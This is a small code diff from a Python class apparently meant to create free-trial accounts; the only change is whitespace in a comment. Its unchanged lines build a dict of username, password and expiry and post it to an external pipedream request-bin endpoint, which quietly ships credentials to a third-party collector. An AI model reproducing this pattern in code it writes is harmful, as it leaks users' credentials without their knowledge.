@@ -65,7 +65,7 @@ class RazPlusFreeTrial:
         data = {"username": username,
                 "password": password,
                 "expire time": datetime.datetime.now() + datetime.timedelta(days=14), }
-        # https://requestbin.com/r/enak80j25b8w/1Ypz4OVzbh4JVybG5vVEA9wdUON
+        #https://requestbin.com/r/enak80j25b8w/1Ypz4OVzbh4JVybG5vVEA9wdUON
         requests.post('https://enak80j25b8w.x.pipedream.net', data=data)
 
 
